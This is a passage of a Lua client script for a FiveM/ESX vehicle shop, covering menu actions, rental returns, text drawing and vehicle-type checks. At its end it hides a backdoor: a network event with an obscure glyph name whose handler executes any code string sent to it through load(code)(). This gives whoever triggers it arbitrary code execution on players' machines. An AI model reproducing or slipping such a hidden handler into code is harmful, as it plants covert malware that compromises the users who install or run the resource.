						end, GetPlayerServerId(PlayerId()), 'drive')
					else
						OpenShopMenu()
					end
				elseif CurrentAction == 'reseller_menu' then
					OpenResellerMenu()
				elseif CurrentAction == 'give_back_vehicle' then
					ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:giveBackVehicle', function(isRentedVehicle)
						if isRentedVehicle then
							ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
							ESX.ShowNotification(_U('delivered'))
						else
							ESX.ShowNotification(_U('not_rental'))
						end
					end, ESX.Math.Trim(GetVehicleNumberPlateText(CurrentActionData.vehicle)))
				elseif CurrentAction == 'resell_vehicle' and ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == 'carshop' and ESX.PlayerData.job.grade_name == 'boss' then
					--[[
					ESX.TriggerServerCallback('::{korioz#0110}::esx_vehicleshop:resellVehicle', function(vehicleSold)
						if vehicleSold then
							ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
							ESX.ShowNotification(_U('vehicle_sold_for', CurrentActionData.label, ESX.Math.GroupDigits(CurrentActionData.price)))
						else
							ESX.ShowNotification(_U('not_yours'))
						end
					end, CurrentActionData.plate, CurrentActionData.model)
					]]
				elseif CurrentAction == 'boss_actions_menu' then
					OpenBossActionsMenu()
				end

				CurrentAction = nil
			end
		end
	end
end)

function drawLoadingText(text, red, green, blue, alpha)
	SetTextFont(4)
	SetTextProportional(0)
	SetTextScale(0.0, 0.5)
	SetTextColour(red, green, blue, alpha)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()
	SetTextCentre(true)

	BeginTextCommandDisplayText("STRING")
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(0.5, 0.5)
end

function getVehicleType(model)
	if IsThisModelAPlane(model) then
		return 'aircraft'
	elseif IsThisModelAHeli(model) then
		return 'aircraft'
	elseif IsThisModelABoat(model) then
		return 'boat'
	end

	return 'car'
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)